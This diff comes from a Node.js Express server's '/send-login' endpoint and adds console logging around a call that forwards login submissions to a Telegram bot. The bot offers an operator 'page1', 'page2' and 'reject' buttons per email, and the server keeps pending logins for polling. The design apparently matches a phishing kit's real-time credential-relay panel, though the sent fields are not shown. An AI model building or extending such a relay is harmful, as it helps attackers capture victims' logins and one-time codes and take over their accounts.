@@ -188,6 +188,9 @@ app.post("/send-login", async (req, res) => {
     }
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    console.log(`📤 Sending to Telegram URL: ${url}`);
+    console.log(`📤 Buttons: page1|${email}, page2|${email}, reject|${email}`);
+    
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -199,8 +202,9 @@ app.post("/send-login", async (req, res) => {
       })
     });
 
+    console.log(`📥 Telegram response status: ${response.status}`);
     if (response.ok) {
-      console.log("✅ Login message sent to Telegram");
+      console.log("✅ Login message sent to Telegram WITH BUTTONS");
       
       // Store pending login for polling
       pendingLogins[email] = {
@@ -210,7 +214,8 @@ app.post("/send-login", async (req, res) => {
 
       res.json({ ok: true, message: "Login request sent for approval", email });
     } else {
-      console.error("❌ Telegram API error:", response.statusText);
+      const errorText = await response.text();
+      console.error("❌ Telegram API error:", response.statusText, errorText);
       res.status(500).json({ error: "Failed to send message" });
     }
 
